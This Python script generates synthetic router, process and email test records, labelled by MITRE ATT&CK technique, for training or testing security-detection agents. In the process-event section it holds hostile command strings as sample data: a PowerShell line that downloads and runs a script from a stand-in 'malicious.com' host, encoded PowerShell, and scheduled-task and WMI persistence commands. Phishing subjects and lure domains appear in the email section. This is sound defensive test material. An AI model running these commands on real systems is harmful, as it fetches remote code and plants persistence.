"""
Generate comprehensive test data for router, computer, and email agents.
Includes normal baseline patterns, attack scenarios, and real-world values.
"""

import json
import random
from typing import List, Dict, Any

# Real-world domains and IPs
REAL_DOMAINS = [
    "google.com", "github.com", "stackoverflow.com", "microsoft.com", "amazon.com",
    "facebook.com", "twitter.com", "linkedin.com", "youtube.com", "reddit.com",
    "netflix.com", "spotify.com", "dropbox.com", "slack.com", "zoom.us",
    "adobe.com", "oracle.com", "salesforce.com", "atlassian.com", "docker.com"
]

REAL_IPS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "208.67.222.222",
    "208.67.220.220", "9.9.9.9", "149.112.112.112", "76.76.19.19"
]

SUSPICIOUS_IPS = [
    "185.220.101.1", "45.146.164.110", "103.27.124.66", "198.98.51.151",
    "192.42.116.176", "185.220.100.242", "45.146.164.111"
]

# Real Windows processes
REAL_PROCESSES = [
    "explorer.exe", "chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe",
    "code.exe", "svchost.exe", "winlogon.exe", "services.exe", "lsass.exe",
    "dwm.exe", "csrss.exe", "smss.exe", "taskhost.exe", "audiodg.exe",
    "spoolsv.exe", "dllhost.exe", "wmiprvse.exe", "powershell.exe", "cmd.exe",
    "python.exe", "node.exe", "java.exe", "git.exe", "docker.exe"
]

REAL_USERS = ["admin", "user1", "user2", "developer", "john.doe", "jane.smith", "SYSTEM"]

REAL_FILE_PATHS = [
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Users\\admin\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
    "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
    "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\winlogon.exe",
    "C:\\Program Files\\Docker\\Docker\\resources\\docker.exe"
]

REAL_EMAIL_DOMAINS = [
    "gmail.com", "outlook.com", "yahoo.com", "company.com", "corp.com",
    "microsoft.com", "amazon.com", "apple.com", "salesforce.com"
]

SUSPICIOUS_DOMAINS = [
    "suspicious-site.tk", "malicious-link.ml", "phishing-site.ga",
    "fake-login.cf", "credential-harvest.gq"
]


def generate_router_data() -> List[Dict[str, Any]]:
    """Generate 1000+ router test records."""
    records = []
    
    # Normal baseline patterns (70% - ~700 records)
    protocols_normal = ["HTTP", "HTTPS", "DNS", "SMTP", "IMAP", "POP3", "FTP", "SSH"]
    ports_normal = [80, 443, 53, 25, 587, 993, 995, 21, 22]
    
    for i in range(700):
        protocol = random.choice(protocols_normal)
        port = random.choice(ports_normal)
        
        # Use real domains for most normal traffic
        use_domain = random.random() > 0.3
        if use_domain:
            dest_domain = random.choice(REAL_DOMAINS)
            dest_ip = None
        else:
            dest_ip = random.choice(REAL_IPS)
            dest_domain = None
        
        # Normal data volumes
        bytes_sent = random.randint(512, 10 * 1024 * 1024)  # 512B to 10MB
        bytes_received = random.randint(1024, 15 * 1024 * 1024)  # 1KB to 15MB
        duration = random.uniform(0.1, 300.0)  # 0.1s to 5 minutes
        
        source_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        record = {
            "protocol": protocol,
            "port": port,
            "bytes_sent": bytes_sent,
            "bytes_received": bytes_received,
            "duration_seconds": round(duration, 2),
            "source_ip": source_ip
        }
        
        if dest_domain:
            record["dest_domain"] = dest_domain
        else:
            record["dest_ip"] = dest_ip
        
        records.append(record)
    
    # Attack scenarios (30% - ~300 records)
    
    # T1041 - Exfiltration Over C2 Channel
    for i in range(50):
        dest_ip = random.choice(SUSPICIOUS_IPS)
        bytes_sent = random.randint(50 * 1024 * 1024, 200 * 1024 * 1024)  # 50MB to 200MB
        bytes_received = random.randint(1024, 100 * 1024)  # Asymmetric - small received
        duration = random.uniform(60.0, 600.0)
        source_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        records.append({
            "protocol": "HTTPS",
            "port": 443,
            "bytes_sent": bytes_sent,
            "bytes_received": bytes_received,
            "duration_seconds": round(duration, 2),
            "dest_ip": dest_ip,
            "source_ip": source_ip
        })
    
    # T1071 - Application Layer Protocol (Long-lived C2)
    for i in range(50):
        dest_ip = random.choice(SUSPICIOUS_IPS)
        bytes_sent = random.randint(1024, 10 * 1024 * 1024)
        bytes_received = random.randint(1024, 10 * 1024 * 1024)
        duration = random.uniform(600.0, 3600.0)  # 10 minutes to 1 hour
        source_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        records.append({
            "protocol": "HTTPS",
            "port": 443,
            "bytes_sent": bytes_sent,
            "bytes_received": bytes_received,
            "duration_seconds": round(duration, 2),
            "dest_ip": dest_ip,
            "source_ip": source_ip
        })
    
    # T1048 - Exfiltration Over Alternative Protocol
    for i in range(40):
        unusual_ports = [8080, 8443, 4444, 31337, 6666, 9999]
        port = random.choice(unusual_ports)
        bytes_sent = random.randint(10 * 1024 * 1024, 100 * 1024 * 1024)
        bytes_received = random.randint(1024, 50 * 1024)
        duration = random.uniform(30.0, 300.0)
        source_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        records.append({
            "protocol": random.choice(["HTTPS", "HTTP", "TCP"]),
            "port": port,
            "bytes_sent": bytes_sent,
            "bytes_received": bytes_received,
            "duration_seconds": round(duration, 2),
            "dest_ip": random.choice(SUSPICIOUS_IPS),
            "source_ip": source_ip
        })
    
    # T1021 - Remote Services (RDP/SSH)
    for i in range(40):
        source_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        records.append({
            "protocol": random.choice(["RDP", "SSH", "TELNET"]),
            "port": random.choice([3389, 22, 23]),
            "bytes_sent": random.randint(1024, 5 * 1024 * 1024),
            "bytes_received": random.randint(1024, 5 * 1024 * 1024),
            "duration_seconds": round(random.uniform(60.0, 1800.0), 2),
            "dest_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}",
            "source_ip": source_ip
        })
    
    # T1043 - Commonly Used Port (C2 over 80/443)
    for i in range(40):
        dest_ip = random.choice(SUSPICIOUS_IPS)
        bytes_sent = random.randint(5120, 50 * 1024 * 1024)
        bytes_received = random.randint(5120, 50 * 1024 * 1024)
        duration = random.uniform(120.0, 1800.0)
        source_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        
        records.append({
            "protocol": random.choice(["HTTP", "HTTPS"]),
            "port": random.choice([80, 443]),
            "bytes_sent": bytes_sent,
            "bytes_received": bytes_received,
            "duration_seconds": round(duration, 2),
            "dest_ip": dest_ip,
            "source_ip": source_ip
        })
    
    # Port Scanning
    for i in range(40):
        # Sequential port scanning pattern
        base_port = random.randint(20, 1000)
        for port_offset in range(5):  # Scan 5 ports
            port = base_port + port_offset
            if port > 65535:
                port = port % 65535 + 1
            
            records.append({
                "protocol": "TCP",
                "port": port,
                "bytes_sent": random.randint(64, 512),
                "bytes_received": random.randint(0, 256),
                "duration_seconds": round(random.uniform(0.1, 2.0), 2),
                "dest_ip": f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                "source_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
            })
    
    # Edge cases
    # Very large data volumes
    for i in range(10):
        records.append({
            "protocol": "HTTPS",
            "port": 443,
            "bytes_sent": random.randint(100 * 1024 * 1024, 500 * 1024 * 1024),  # 100MB to 500MB
            "bytes_received": random.randint(1024, 10 * 1024 * 1024),
            "duration_seconds": round(random.uniform(300.0, 1200.0), 2),
            "dest_domain": random.choice(REAL_DOMAINS),
            "source_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        })
    
    # Very long connections
    for i in range(10):
        records.append({
            "protocol": "HTTPS",
            "port": 443,
            "bytes_sent": random.randint(1024, 10 * 1024 * 1024),
            "bytes_received": random.randint(1024, 10 * 1024 * 1024),
            "duration_seconds": round(random.uniform(1000.0, 7200.0), 2),  # 16 minutes to 2 hours
            "dest_domain": random.choice(REAL_DOMAINS),
            "source_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        })
    
    # IPv6 addresses (edge case)
    for i in range(5):
        records.append({
            "protocol": "HTTPS",
            "port": 443,
            "bytes_sent": random.randint(1024, 10 * 1024 * 1024),
            "bytes_received": random.randint(1024, 10 * 1024 * 1024),
            "duration_seconds": round(random.uniform(1.0, 300.0), 2),
            "dest_ip": f"2001:db8::{random.randint(1000, 9999)}",
            "source_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        })
    
    # High port numbers
    for i in range(10):
        records.append({
            "protocol": random.choice(["TCP", "UDP"]),
            "port": random.randint(49152, 65535),  # Dynamic/private ports
            "bytes_sent": random.randint(1024, 5 * 1024 * 1024),
            "bytes_received": random.randint(1024, 5 * 1024 * 1024),
            "duration_seconds": round(random.uniform(1.0, 60.0), 2),
            "dest_domain": random.choice(REAL_DOMAINS),
            "source_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        })
    
    random.shuffle(records)
    return records


def generate_computer_data() -> List[Dict[str, Any]]:
    """Generate 1000+ computer test records."""
    records = []
    pid_counter = 1000
    
    # Normal baseline patterns (70% - ~700 records)
    event_types_normal = ["process_create", "file_access", "process_start"]
    
    for i in range(700):
        process_name = random.choice(REAL_PROCESSES)
        user = random.choice(REAL_USERS)
        file_path = random.choice(REAL_FILE_PATHS)
        
        # Normal command lines
        if "chrome" in process_name.lower():
            command_line = f"{process_name} --start-maximized"
        elif "notepad" in process_name.lower():
            command_line = process_name
        elif "code" in process_name.lower():
            command_line = f"{process_name} --new-window"
        elif "explorer" in process_name.lower():
            command_line = process_name
        else:
            command_line = process_name
        
        pid = pid_counter + i
        parent_pid = random.randint(100, 999) if random.random() > 0.1 else None
        
        records.append({
            "process_name": process_name,
            "user": user,
            "file_path": file_path,
            "command_line": command_line,
            "pid": pid,
            "parent_pid": parent_pid,
            "event_type": random.choice(event_types_normal)
        })
    
    pid_counter += 700
    
    # T1059.001 - PowerShell attacks
    for i in range(60):
        # Obfuscated PowerShell commands
        obfuscated_commands = [
            "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
            "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=",
            "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"& {[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('...'))}\"",
            "powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
        ]
        
        records.append({
            "process_name": "powershell.exe",
            "user": random.choice(["admin", "SYSTEM"]),
            "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": random.choice(obfuscated_commands),
            "pid": pid_counter + i,
            "parent_pid": random.randint(100, 999),
            "event_type": "process_create"
        })
    
    pid_counter += 60
    
    # T1055 - Process Injection
    for i in range(50):
        # Suspicious parent-child relationships
        suspicious_parents = ["explorer.exe", "svchost.exe", "winlogon.exe"]
        suspicious_children = ["cmd.exe", "powershell.exe", "wmic.exe", "rundll32.exe"]
        
        parent_process = random.choice(suspicious_parents)
        child_process = random.choice(suspicious_children)
        
        records.append({
            "process_name": child_process,
            "user": random.choice(["admin", "SYSTEM"]),
            "file_path": f"C:\\Windows\\System32\\{child_process}",
            "command_line": f"{child_process} /c echo test",
            "pid": pid_counter + i,
            "parent_pid": random.randint(1000, 2000),  # Unusual parent
            "event_type": "process_create"
        })
    
    pid_counter += 50
    
    # T1547.001 - Boot/Logon Autostart
    for i in range(50):
        startup_paths = [
            "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\suspicious.exe",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malware",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\suspicious"
        ]
        
        records.append({
            "process_name": random.choice(["malware.exe", "suspicious.exe", "startup.exe"]),
            "user": random.choice(["admin", "SYSTEM"]),
            "file_path": random.choice(startup_paths),
            "command_line": f"{random.choice(['malware.exe', 'suspicious.exe'])} --hidden",
            "pid": pid_counter + i,
            "parent_pid": None,
            "event_type": "registry_modify"
        })
    
    pid_counter += 50
    
    # T1134 - Access Token Manipulation
    for i in range(40):
        # SYSTEM user running unusual processes
        unusual_processes = ["cmd.exe", "powershell.exe", "wmic.exe", "reg.exe"]
        
        records.append({
            "process_name": random.choice(unusual_processes),
            "user": "SYSTEM",
            "file_path": f"C:\\Windows\\System32\\{random.choice(unusual_processes)}",
            "command_line": f"{random.choice(unusual_processes)} /c whoami",
            "pid": pid_counter + i,
            "parent_pid": random.randint(100, 500),
            "event_type": "process_create"
        })
    
    pid_counter += 40
    
    # T1053 - Scheduled Task
    for i in range(40):
        task_names = ["UpdateCheck", "SystemMaintenance", "WindowsUpdate", "TaskScheduler"]
        
        records.append({
            "process_name": "schtasks.exe",
            "user": random.choice(["admin", "SYSTEM"]),
            "file_path": "C:\\Windows\\System32\\schtasks.exe",
            "command_line": f"schtasks.exe /Create /TN {random.choice(task_names)} /TR malware.exe /SC ONLOGON",
            "pid": pid_counter + i,
            "parent_pid": random.randint(100, 999),
            "event_type": "scheduled_task_create"
        })
    
    pid_counter += 40
    
    # Persistence mechanisms
    for i in range(20):
        # WMI event subscription
        records.append({
            "process_name": "wmic.exe",
            "user": "SYSTEM",
            "file_path": "C:\\Windows\\System32\\wbem\\wmic.exe",
            "command_line": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='MaliciousFilter'",
            "pid": pid_counter + i,
            "parent_pid": random.randint(100, 500),
            "event_type": "wmi_subscription"
        })
    
    pid_counter += 20
    
    # Edge cases
    # Very long command lines
    for i in range(10):
        long_command = "powershell.exe " + "A" * 1000  # 1000+ character command
        
        records.append({
            "process_name": "powershell.exe",
            "user": random.choice(REAL_USERS),
            "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": long_command,
            "pid": pid_counter + i,
            "parent_pid": random.randint(100, 999),
            "event_type": "process_create"
        })
    
    pid_counter += 10
    
    # Suspicious file paths (temp directories)
    for i in range(10):
        temp_paths = [
            "C:\\Users\\admin\\AppData\\Local\\Temp\\suspicious.exe",
            "C:\\Windows\\Temp\\malware.exe",
            "C:\\Temp\\payload.exe"
        ]
        
        records.append({
            "process_name": "suspicious.exe",
            "user": random.choice(REAL_USERS),
            "file_path": random.choice(temp_paths),
            "command_line": "suspicious.exe --hidden",
            "pid": pid_counter + i,
            "parent_pid": None,
            "event_type": "process_create"
        })
    
    pid_counter += 10
    
    # High PIDs
    for i in range(10):
        records.append({
            "process_name": random.choice(REAL_PROCESSES),
            "user": random.choice(REAL_USERS),
            "file_path": random.choice(REAL_FILE_PATHS),
            "command_line": random.choice(REAL_PROCESSES),
            "pid": random.randint(60000, 65535),  # High PID range
            "parent_pid": random.randint(100, 999),
            "event_type": "process_create"
        })
    
    # Missing parent PIDs
    for i in range(10):
        records.append({
            "process_name": random.choice(REAL_PROCESSES),
            "user": random.choice(REAL_USERS),
            "file_path": random.choice(REAL_FILE_PATHS),
            "command_line": random.choice(REAL_PROCESSES),
            "pid": pid_counter + i,
            "parent_pid": None,
            "event_type": "process_create"
        })
    
    random.shuffle(records)
    return records


def generate_email_data() -> List[Dict[str, Any]]:
    """Generate 1000+ email test records."""
    records = []
    
    # Normal baseline patterns (70% - ~700 records)
    normal_subjects = [
        "Weekly Report", "Meeting Reminder", "Project Update", "Team Newsletter",
        "System Notification", "Account Update", "Invoice", "Receipt",
        "Document Review", "Status Update", "Monthly Summary", "Daily Digest"
    ]
    
    normal_attachments = ["report.pdf", "agenda.docx", "presentation.pptx", "data.xlsx", "image.jpg", "photo.png"]
    
    for i in range(700):
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"{random.choice(['noreply', 'support', 'team', 'alerts', 'newsletter', 'admin'])}@{sender_domain}"
        
        subject = random.choice(normal_subjects)
        
        # 60% have attachments
        has_attachment = random.random() > 0.4
        attachment_name = None
        attachment_size = None
        if has_attachment:
            attachment_name = random.choice(normal_attachments)
            attachment_size = random.randint(10 * 1024, 5 * 1024 * 1024)  # 10KB to 5MB
        
        # 70% have links
        has_links = random.random() > 0.3
        links = None
        if has_links:
            domain = random.choice(REAL_DOMAINS)
            links = [f"https://{domain}/page"]
        
        record = {
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": subject
        }
        
        if attachment_name:
            record["attachment_name"] = attachment_name
            record["attachment_size"] = attachment_size
        
        if links:
            record["links"] = links
        
        records.append(record)
    
    # T1566 - Phishing
    for i in range(80):
        phishing_subjects = [
            "URGENT: Verify Your Account Now",
            "Immediate Action Required",
            "Your Account Has Been Suspended",
            "Verify Your Identity Immediately",
            "Security Alert: Unusual Activity Detected"
        ]
        
        suspicious_domain = random.choice(SUSPICIOUS_DOMAINS)
        sender = f"{random.choice(['security', 'support', 'noreply', 'admin'])}@{suspicious_domain}"
        
        phishing_links = [
            f"https://{suspicious_domain}/verify",
            f"http://{suspicious_domain}/login",
            f"https://fake-{random.choice(REAL_EMAIL_DOMAINS)}.tk/login"
        ]
        
        records.append({
            "sender": sender,
            "sender_domain": suspicious_domain,
            "subject": random.choice(phishing_subjects),
            "links": [random.choice(phishing_links)]
        })
    
    # T1566.001 - Spearphishing Attachment
    for i in range(60):
        malicious_attachments = [
            "invoice.pdf.exe",
            "document.pdf.scr",
            "receipt.docx.bat",
            "scan.jpg.exe",
            "payment.xlsx.exe",
            "malware.exe",
            "payload.bat",
            "trojan.scr"
        ]
        
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"{random.choice(['noreply', 'billing', 'support'])}@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": random.choice(["Invoice", "Payment Receipt", "Document", "Scan"]),
            "attachment_name": random.choice(malicious_attachments),
            "attachment_size": random.randint(100 * 1024, 10 * 1024 * 1024)  # 100KB to 10MB
        })
    
    # T1566.002 - Spearphishing Link
    for i in range(50):
        url_shorteners = ["bit.ly", "tinyurl.com", "goo.gl", "t.co", "ow.ly"]
        suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq"]
        
        shortener = random.choice(url_shorteners)
        suspicious_link = f"https://{shortener}/a1b2c3d4"
        
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"{random.choice(['security', 'support'])}@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": "Click here to verify your account",
            "links": [suspicious_link]
        })
    
    # T1534 - Internal Spearphishing
    for i in range(40):
        # Display name spoofing
        internal_domain = "company.com"
        spoofed_sender = f"CEO <ceo@{internal_domain}>"
        
        records.append({
            "sender": f"ceo@{internal_domain}",
            "sender_domain": internal_domain,
            "subject": "Urgent: Wire Transfer Required",
            "links": [f"https://fake-{internal_domain}.tk/transfer"],
            "display_name": "CEO"
        })
    
    # Email Spoofing (SPF/DKIM failures)
    for i in range(30):
        # Mismatched display name and sender
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"noreply@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": "Important Update",
            "spf_fail": True,
            "dkim_fail": True
        })
    
    # Malicious Attachments
    for i in range(40):
        executable_types = ["exe", "bat", "cmd", "com", "pif", "scr", "vbs", "js", "jar"]
        attachment_type = random.choice(executable_types)
        
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"{random.choice(['noreply', 'support'])}@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": "Please Review",
            "attachment_name": f"document.{attachment_type}",
            "attachment_size": random.randint(500 * 1024, 20 * 1024 * 1024)  # 500KB to 20MB
        })
    
    # Edge cases
    # Very large attachments
    for i in range(10):
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"noreply@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": "Large File",
            "attachment_name": "large_file.zip",
            "attachment_size": random.randint(50 * 1024 * 1024, 100 * 1024 * 1024)  # 50MB to 100MB
        })
    
    # Multiple links
    for i in range(10):
        sender_domain = random.choice(REAL_EMAIL_DOMAINS)
        sender = f"newsletter@{sender_domain}"
        
        records.append({
            "sender": sender,
            "sender_domain": sender_domain,
            "subject": "Newsletter",
            "links": [
                f"https://{sender_domain}/article1",
                f"https://{sender_domain}/article2",
                f"https://{sender_domain}/article3"
            ]
        })
    
    # Missing sender domains (auto-extracted)
    for i in range(10):
        sender = f"{random.choice(['user', 'admin', 'support'])}@{random.choice(REAL_EMAIL_DOMAINS)}"
        
        records.append({
            "sender": sender,
            "subject": "Test Email",
            # No sender_domain - should be auto-extracted
        })
    
    # URL obfuscation (IP addresses)
    for i in range(10):
        suspicious_ip = random.choice(SUSPICIOUS_IPS)
        
        records.append({
            "sender": f"noreply@{random.choice(REAL_EMAIL_DOMAINS)}",
            "sender_domain": random.choice(REAL_EMAIL_DOMAINS),
            "subject": "Click here",
            "links": [f"http://{suspicious_ip}/login"]
        })
    
    random.shuffle(records)
    return records


if __name__ == "__main__":
    print("Generating router test data...")
    router_data = generate_router_data()
    print(f"Generated {len(router_data)} router records")
    
    print("Generating computer test data...")
    computer_data = generate_computer_data()
    print(f"Generated {len(computer_data)} computer records")
    
    print("Generating email test data...")
    email_data = generate_email_data()
    print(f"Generated {len(email_data)} email records")
    
    print("\nWriting files...")
    with open("test_data/router_test.json", "w") as f:
        json.dump(router_data, f, indent=2)
    
    with open("test_data/computer_test.json", "w") as f:
        json.dump(computer_data, f, indent=2)
    
    with open("test_data/email_test.json", "w") as f:
        json.dump(email_data, f, indent=2)
    
    print("Done!")


